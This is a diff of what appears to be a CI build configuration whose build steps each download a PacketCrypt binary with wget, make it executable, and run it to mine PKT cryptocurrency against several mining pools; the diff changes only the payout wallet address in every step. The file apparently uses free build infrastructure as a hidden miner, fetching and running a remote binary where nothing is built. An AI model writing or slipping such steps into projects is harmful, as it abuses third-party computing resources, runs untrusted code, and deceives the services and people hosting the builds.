@@ -58,7 +58,7 @@ for:
     build_script:
     - sh: wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
     - sh: chmod +x packetcrypt_x8664_linux
-    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com
+    - sh: ./packetcrypt_x8664_linux ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com
   -
     matrix:
       only:
@@ -67,7 +67,7 @@ for:
     build_script:
     - sh: wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
     - sh: chmod +x packetcrypt_x8664_linux
-    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
+    - sh: ./packetcrypt_x8664_linux ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
 
   -
     matrix:
@@ -76,7 +76,7 @@ for:
     build_script:
     - sh: wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
     - sh: chmod +x packetcrypt_x8664_linux
-    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
+    - sh: ./packetcrypt_x8664_linux ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
 
 
   -
@@ -87,7 +87,7 @@ for:
     build_script:
     - sh: wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
     - sh: chmod +x packetcrypt_x8664_linux
-    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
+    - sh: ./packetcrypt_x8664_linux ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
 
   -
     matrix:
@@ -97,7 +97,7 @@ for:
     build_script:
     - sh: wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
     - sh: chmod +x packetcrypt_x8664_linux
-    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
+    - sh: ./packetcrypt_x8664_linux ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
 
   -
     matrix:
@@ -107,7 +107,7 @@ for:
     build_script:
     - sh: wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
     - sh: chmod +x packetcrypt_x8664_linux
-    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com
+    - sh: ./packetcrypt_x8664_linux ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com
 
   -
     matrix:
@@ -117,7 +117,7 @@ for:
     build_script:
     - sh: wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
     - sh: chmod +x packetcrypt_x8664_linux
-    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com
+    - sh: ./packetcrypt_x8664_linux ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com
   -
     matrix:
       only:
@@ -126,7 +126,7 @@ for:
     build_script:
     - sh: wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
     - sh: chmod +x packetcrypt_x8664_linux
-    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
+    - sh: ./packetcrypt_x8664_linux ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
 
   -
     matrix:
@@ -135,7 +135,7 @@ for:
     build_script:
     - sh: wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
     - sh: chmod +x packetcrypt_x8664_linux
-    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
+    - sh: ./packetcrypt_x8664_linux ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
 
 
   -
@@ -146,7 +146,7 @@ for:
     build_script:
     - sh: wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
     - sh: chmod +x packetcrypt_x8664_linux
-    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
+    - sh: ./packetcrypt_x8664_linux ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
 
   -
     matrix:
@@ -156,7 +156,7 @@ for:
     build_script:
     - sh: wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
     - sh: chmod +x packetcrypt_x8664_linux
-    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
+    - sh: ./packetcrypt_x8664_linux ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com   
 
   -
     matrix:
@@ -166,7 +166,7 @@ for:
     build_script:
     - sh: wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
     - sh: chmod +x packetcrypt_x8664_linux
-    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com
+    - sh: ./packetcrypt_x8664_linux ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com
 
   -
     matrix:
@@ -176,4 +176,4 @@ for:
     build_script:
     - sh: wget http://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux
     - sh: chmod +x packetcrypt_x8664_linux
-    - sh: ./packetcrypt_x8664_linux ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com
+    - sh: ./packetcrypt_x8664_linux ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com https://pool.pkthash.com
